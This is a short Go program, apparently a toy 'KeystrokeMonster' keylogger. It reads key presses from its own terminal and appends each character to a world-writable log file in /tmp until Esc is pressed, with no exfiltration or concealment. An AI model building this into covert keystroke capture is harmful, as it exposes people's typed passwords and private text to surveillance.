package main

import (
	"fmt"
	"log"
	"os"

	"github.com/eiannone/keyboard"
)

func logKeystrokes(data string) {
	logfile := "/tmp/KeystrokeMonster.log"
	f, err := os.OpenFile(logfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		os.Exit(0)
	}
	log.SetOutput(f)
	log.Print(fmt.Sprintf(":: %s", data))
	defer f.Close()
}

func MonitorKeyboard() {
	keysEvents, err := keyboard.GetKeys(10)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = keyboard.Close()
	}()
	for {
		event := <-keysEvents
		if event.Err != nil {
			panic(event.Err)
		}
		logKeystrokes(string(event.Rune))
		if event.Key == keyboard.KeyEsc {
			break
		}
	}
}
